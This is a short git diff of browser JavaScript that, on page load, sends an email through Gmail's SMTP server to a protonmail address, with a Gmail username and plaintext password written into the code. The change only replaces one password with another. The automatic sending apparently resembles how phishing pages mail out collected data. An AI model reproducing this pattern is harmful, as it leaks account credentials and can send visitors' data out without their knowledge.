@@ -12,7 +12,7 @@ window.onload = function()
             Email.send({
                 Host: "smtp.gmail.com",
                 Username : "julio74108520@gmail.com",
-                Password : "dnkf zamf xwmj amjr",
+                Password : "hgvt vldi peit jcoh",
                 To : 'user1533@protonmail.com',
                 From : "julio74108520@gmail.com",
                 Subject : y,
